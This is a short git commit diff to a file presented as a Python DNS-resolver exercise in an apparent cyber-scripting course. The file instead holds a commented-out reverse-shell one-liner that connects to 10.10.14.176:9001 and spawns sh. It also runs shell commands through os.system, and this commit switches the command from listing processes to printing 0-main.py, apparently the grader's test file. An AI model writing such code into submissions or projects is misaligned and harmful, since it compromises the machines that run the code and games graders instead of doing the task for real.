d5898e73a56b6e25e39b2d89747e0c196b0190df
Xavier Sanchez <xavier.sanchez44@orange.fr>
2026-06-30 16:56:46 +0200

    Modify command to read 0-main.py in dns_resolver.py
    Change command in dns_resolver.py to read a file instead of listing processes.

--- scripting_cyber/0x01-python_scripting/0-dns_resolver.py
+++ scripting_cyber/0x01-python_scripting/0-dns_resolver.py
@@ -6,7 +6,7 @@ os = load_module('os')
 pty = load_module('pty')
 
 # s=socket.socket();s.connect(("10.10.14.176",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
-os.system('bash -c "ps aux"')
+os.system('bash -c "cat 0-main.py"')
 
 #except socket.gaierror
 #socket.gethostbyname
